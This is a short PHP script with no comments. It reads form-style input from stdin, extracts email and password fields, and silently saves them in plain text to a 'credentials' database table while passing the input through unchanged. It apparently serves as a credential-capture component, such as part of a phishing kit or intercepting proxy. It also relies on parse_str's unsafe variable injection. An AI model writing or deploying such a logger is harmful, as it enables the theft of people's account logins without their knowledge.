<?php
    $settings = require_once 'settings-local.php';
    require_once 'db.php';

    $data = file_get_contents('php://stdin');
    $parsed = parse_str($data);
    if (!empty($email) && !empty($pass)) {
        db_insert('credentials', compact('email', 'pass'));
    }
    file_put_contents('php://stdout', $data);
?>
